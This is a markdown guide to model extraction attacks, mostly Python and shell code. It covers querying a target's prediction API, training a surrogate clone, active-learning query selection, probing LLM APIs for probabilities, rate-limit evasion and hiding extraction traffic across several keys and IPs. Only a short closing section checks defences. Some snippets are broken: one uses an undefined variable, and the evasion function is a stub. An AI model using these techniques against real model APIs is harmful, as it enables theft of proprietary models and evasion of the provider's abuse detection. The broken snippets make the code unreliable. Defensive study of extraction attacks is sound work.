# Model Extraction Attack Guide

> Steal or replicate a machine learning model by querying its API and using the responses to train a substitute model. Covers query-based extraction, API abuse patterns, and defense detection.

## 1. Understanding Model Extraction

Model extraction (model stealing) aims to replicate a target model's functionality by observing its input-output behavior. The attacker creates a surrogate model that approximates the target without access to its weights, architecture, or training data.

**Attack goals:**
- Replicate model predictions (functionally equivalent clone)
- Extract decision boundaries for adversarial attack crafting
- Steal intellectual property (proprietary model logic)
- Bypass rate limiting by querying a local copy

## 2. Query-Based Extraction Strategy

Systematically query the target to build a training dataset:

```python
import numpy as np
import requests
from typing import List, Tuple

def query_target_model(inputs: List[dict], api_url: str, api_key: str) -> List[dict]:
    """Query the target model API and collect responses."""
    results = []
    for inp in inputs:
        resp = requests.post(
            api_url,
            json={"input": inp},
            headers={"Authorization": f"Bearer {api_key}"}
        )
        if resp.status_code == 200:
            results.append({
                "input": inp,
                "output": resp.json()["prediction"],
                "confidence": resp.json().get("confidence", None)
            })
    return results

def generate_synthetic_queries(n_samples: int, input_dim: int) -> np.ndarray:
    """Generate diverse queries to maximize information extraction."""
    queries = []
    # Uniform random sampling
    queries.append(np.random.uniform(-1, 1, (n_samples // 3, input_dim)))
    # Boundary-focused sampling (near decision boundaries)
    queries.append(np.random.normal(0, 0.1, (n_samples // 3, input_dim)))
    # Adversarial sampling (extreme values)
    queries.append(np.random.choice([-1, 1], (n_samples // 3, input_dim)))
    return np.vstack(queries)
```

## 3. Training the Surrogate Model

Use collected query-response pairs to train a clone:

```python
from sklearn.ensemble import RandomForestClassifier
from sklearn.neural_network import MLPClassifier
import pickle

def train_surrogate(query_results: list, model_type: str = "mlp") -> object:
    """Train a surrogate model from stolen query-response pairs."""
    X = np.array([r["input"] for r in query_results])
    y = np.array([r["output"] for r in query_results])
    
    if model_type == "mlp":
        surrogate = MLPClassifier(
            hidden_layer_sizes=(256, 128, 64),
            max_iter=1000,
            early_stopping=True
        )
    elif model_type == "rf":
        surrogate = RandomForestClassifier(n_estimators=200)
    
    surrogate.fit(X, y)
    return surrogate

def evaluate_fidelity(surrogate, target_api, test_inputs):
    """Measure how well the surrogate matches the target."""
    target_predictions = query_target_model(test_inputs, target_api, key)
    surrogate_predictions = surrogate.predict(test_inputs)
    
    agreement = np.mean(
        [t["output"] == s for t, s in zip(target_predictions, surrogate_predictions)]
    )
    print(f"[*] Fidelity: {agreement:.2%} agreement with target model")
    return agreement
```

## 4. Active Learning for Efficient Extraction

Minimize queries by focusing on informative samples:

```python
from sklearn.metrics import pairwise_distances

def active_query_selection(surrogate, candidate_pool: np.ndarray, n_select: int) -> np.ndarray:
    """Select the most informative queries using uncertainty sampling."""
    # Get prediction probabilities from current surrogate
    probs = surrogate.predict_proba(candidate_pool)
    
    # Uncertainty = entropy of prediction
    entropy = -np.sum(probs * np.log(probs + 1e-10), axis=1)
    
    # Select highest uncertainty samples
    uncertain_indices = np.argsort(entropy)[-n_select:]
    
    return candidate_pool[uncertain_indices]

def iterative_extraction(target_api, api_key, n_rounds=10, queries_per_round=100):
    """Iteratively extract model with active learning."""
    all_results = []
    surrogate = None
    
    for round_num in range(n_rounds):
        if surrogate is None:
            # Initial random queries
            queries = generate_synthetic_queries(queries_per_round, input_dim=10)
        else:
            # Active selection based on current surrogate uncertainty
            candidate_pool = generate_synthetic_queries(queries_per_round * 10, 10)
            queries = active_query_selection(surrogate, candidate_pool, queries_per_round)
        
        # Query target
        results = query_target_model(queries.tolist(), target_api, api_key)
        all_results.extend(results)
        
        # Retrain surrogate
        surrogate = train_surrogate(all_results)
        print(f"Round {round_num+1}: {len(all_results)} total queries collected")
    
    return surrogate
```

## 5. LLM-Specific Extraction Techniques

Extract capabilities from language model APIs:

```bash
# Technique 1: Systematic prompt probing to map model behavior
# Test classification boundaries
for category in "positive" "negative" "neutral"; do
  echo "Classify this text: 'The product is ${category}'" | \
    curl -s -X POST https://api.target.com/classify \
    -H "Content-Type: application/json" \
    -d "{\"text\": \"$(cat)\"}" >> extraction_log.jsonl
done

# Technique 2: Logit extraction (if API returns probabilities)
# High-temperature sampling reveals more about the distribution
curl -s https://api.target.com/generate \
  -d '{"prompt": "The capital of France is", "temperature": 100, "top_k": 50}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['logprobs'])"
```

## 6. API Abuse Patterns for Extraction

Techniques to maximize information per query:

```python
def batch_extraction_strategies():
    """Different strategies to extract maximum info per API call."""
    
    strategies = {
        # Strategy 1: Confidence score harvesting
        "confidence_harvest": {
            "method": "Request full probability distribution",
            "query_params": {"return_probs": True, "top_k": 10},
            "info_per_query": "high"
        },
        
        # Strategy 2: Embedding extraction
        "embedding_theft": {
            "method": "Extract intermediate representations",
            "query_params": {"return_embeddings": True},
            "info_per_query": "very_high"
        },
        
        # Strategy 3: Gradient estimation via finite differences
        "gradient_estimation": {
            "method": "Perturb inputs slightly, observe output changes",
            "query_params": {"perturbation_delta": 0.001},
            "info_per_query": "medium"
        },
    }
    return strategies

# Rate limit evasion for sustained extraction
import time
import random

def rate_limited_extraction(queries, api_url, requests_per_minute=30):
    """Extract while staying under rate limits."""
    delay = 60.0 / requests_per_minute
    results = []
    
    for query in queries:
        resp = requests.post(api_url, json=query)
        results.append(resp.json())
        
        # Add jitter to avoid pattern detection
        sleep_time = delay + random.uniform(-0.5, 0.5)
        time.sleep(max(0.1, sleep_time))
    
    return results
```

## 7. Detection and Evasion

Understand how extraction is detected and how to evade:

```python
# Common detection signals (what defenders look for):
DETECTION_SIGNALS = {
    "query_volume": "Unusual number of API calls from single source",
    "query_distribution": "Inputs don't match natural data distribution",
    "systematic_probing": "Grid-like or boundary-focused query patterns",
    "response_usage": "No downstream application of results (pure extraction)",
}

# Evasion techniques:
def evade_detection(queries: list) -> list:
    """Make extraction queries look like legitimate usage."""
    evasion_tactics = []
    
    # Mix extraction queries with legitimate-looking ones
    legitimate_ratio = 0.3
    n_legitimate = int(len(queries) * legitimate_ratio)
    
    # Add noise to query timing (mimic human patterns)
    # Distribute across multiple API keys/IPs
    # Use realistic input distributions
    
    return queries  # Modified to appear natural
```

## 8. Defensive Measures to Test

Verify that model APIs implement extraction countermeasures:

```bash
# Test for extraction defenses:

# 1. Check if API returns full probability distributions (should be limited)
curl -s https://api.target.com/predict \
  -d '{"input": "test", "return_probs": true}' | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print('Probs exposed:', 'probabilities' in d)"

# 2. Test rate limiting effectiveness
for i in $(seq 1 100); do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' https://api.target.com/predict -d '{"input":"test"}')
  echo "$i: $STATUS"
done | grep -c "429"

# 3. Check for watermarking in outputs
# Query same input multiple times — consistent outputs suggest no watermarking
for i in $(seq 1 5); do
  curl -s https://api.target.com/predict -d '{"input":"identical query"}' | md5sum
done
```

Key defenses to verify: rate limiting, query auditing, output perturbation (differential privacy), watermarking, and limiting returned confidence scores.
